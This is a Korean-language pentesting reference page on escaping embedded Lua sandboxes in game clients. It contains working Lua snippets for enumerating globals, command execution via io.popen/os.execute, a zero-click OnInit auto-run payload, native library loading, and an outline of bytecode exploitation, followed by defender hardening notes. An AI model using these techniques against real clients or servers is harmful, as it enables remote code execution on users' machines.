# Lua sandbox 우회 (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

이 페이지에서는 애플리케이션에 내장된 Lua "sandbox"(특히 game clients, plugins 또는 in-app scripting engines)를 열거하고 탈출하기 위한 실용적인 기법을 정리합니다. 많은 engine은 제한된 Lua 환경을 노출하지만, 강력한 globals에 접근할 수 있도록 방치하여 arbitrary command execution을 가능하게 하거나, bytecode loaders가 노출된 경우 native memory corruption까지 유발할 수 있습니다.

핵심 아이디어:
- VM을 알 수 없는 환경으로 취급합니다. _G를 열거하고 접근 가능한 위험한 primitive를 찾습니다.
- stdout/print가 차단된 경우, VM 내부의 UI/IPC channel을 output sink로 악용하여 결과를 확인합니다.
- io/os가 노출되어 있다면 직접적인 command execution(io.popen, os.execute)이 가능한 경우가 많습니다.
- load/loadstring/loadfile이 노출되어 있다면 조작된 Lua bytecode를 실행하여 일부 버전에서 memory safety를 우회할 수 있습니다(≤5.1 verifier는 우회 가능하며, 5.2에서는 verifier가 제거됨). 이를 통해 고급 exploitation이 가능해집니다.

## sandboxed environment 열거

- 접근 가능한 table/function 목록을 확인하기 위해 global environment를 덤프합니다:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- print()를 사용할 수 없다면 VM 내부 채널을 다른 용도로 활용하세요. 예를 들어 사운드 호출 후에만 채팅 출력이 작동하는 MMO housing script VM에서 다음과 같이 안정적인 출력 함수를 만들 수 있습니다:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
대상에 맞게 이 패턴을 일반화하세요: 문자열을 허용하는 모든 textbox, toast, logger 또는 UI callback은 reconnaissance를 위한 stdout으로 사용할 수 있습니다.

## io/os가 노출된 경우 직접 command execution

sandbox가 standard libraries io 또는 os를 여전히 노출한다면, 즉시 command execution이 가능할 가능성이 높습니다:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
- 실행은 client process 내부에서 이루어지므로, external debugger를 차단하는 많은 anti-cheat/antidebug 계층도 in-VM process 생성을 방지하지 못합니다.
- 다음 항목도 확인하세요: package.loadlib (arbitrary DLL/.so loading), native modules를 사용하는 require, LuaJIT의 ffi (존재하는 경우), 그리고 VM 내부에서 권한을 상승시킬 수 있는 debug library.

## auto-run callbacks를 통한 zero-click 트리거

host application이 client에 scripts를 push하고 VM이 auto-run hooks (예: OnInit/OnLoad/OnEnter)를 노출하는 경우, script가 로드되는 즉시 drive-by compromise가 발생하도록 payload를 해당 위치에 삽입합니다:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
모든 동등한 callback(OnLoad, OnEnter 등)은 script가 client로 전송되어 자동으로 실행될 때 이 technique을 일반화합니다.

## recon 중 찾아야 할 위험한 primitives

_G enumeration 중 특히 다음을 확인합니다:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: source 또는 bytecode를 실행하며, 신뢰할 수 없는 bytecode 로딩을 지원합니다.
- package, package.loadlib, require: dynamic library loading 및 module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo 및 hooks.
- LuaJIT-only: ffi.cdef, ffi.load를 사용하여 native code를 직접 호출합니다.

최소 사용 예시(reachable한 경우):

Lua의 loader API는 version에 따라 변경되었습니다. Lua 5.1에서는 `load`가 reader function에서 읽고 `loadstring`이 string에서 읽습니다. Lua 5.2의 `load`는 string 또는 reader function을 모두 허용하며, `loadstring`은 이에 해당하는 기능으로 deprecated되었습니다.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## 선택적 escalation: Lua bytecode loaders 악용

load/loadstring/loadfile에 접근할 수 있지만 io/os가 제한된 경우, 조작된 Lua bytecode를 실행하면 memory disclosure 및 corruption primitive로 이어질 수 있습니다. 주요 사실:
- Lua ≤ 5.1에는 알려진 bypass가 있는 bytecode verifier가 포함되어 있었습니다.<sup>[[4]](#references)</sup>
- Lua 5.2에서는 verifier가 완전히 제거되었습니다(공식 입장: 애플리케이션은 precompiled chunk를 거부해야 함). 따라서 bytecode loading이 금지되지 않은 경우 attack surface가 확대됩니다.<sup>[[2]](#references)[[3]](#references)</sup>
- 일반적인 workflow는 다음과 같습니다: in-VM output을 통해 pointer를 leak하고, type confusion을 일으키는 bytecode를 작성한 다음(예: FORLOOP 또는 다른 opcode 관련), arbitrary read/write 또는 native code execution으로 pivot합니다.<sup>[[2]](#references)[[4]](#references)</sup>

이 경로는 engine/version-specific이며 RE가 필요합니다. 자세한 분석, exploitation primitive 및 games에서의 example gadgetry는 references를 참조하세요.

## Detection and hardening notes (for defenders)

- Server side: user script를 거부하거나 rewrite하고, 안전한 API를 allowlist에 등록하며, io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi를 제거하거나 빈 binding으로 연결합니다.
- Client side: 최소한의 _ENV로 Lua를 실행하고, bytecode loading을 금지하며, strict bytecode verifier 또는 signature checks를 다시 도입하고, client process에서 process creation을 차단합니다.
- Telemetry: script load 직후 gameclient → child process creation이 발생하면 alert를 생성하고, 이를 UI/chat/script event와 correlate합니다.

## References

- [1] [This House is Haunted: AION client(housing Lua VM)의 10년 된 RCE](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Factorio의 Lua Security Flaws 분석](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): bytecode verifier 제거에 관한 Discussion](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Lua 5.1 bytecode exploitation (verifier bypasses/notes가 포함된 gist)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Lua 5.1 Reference Manual](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Lua 5.2 Reference Manual](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
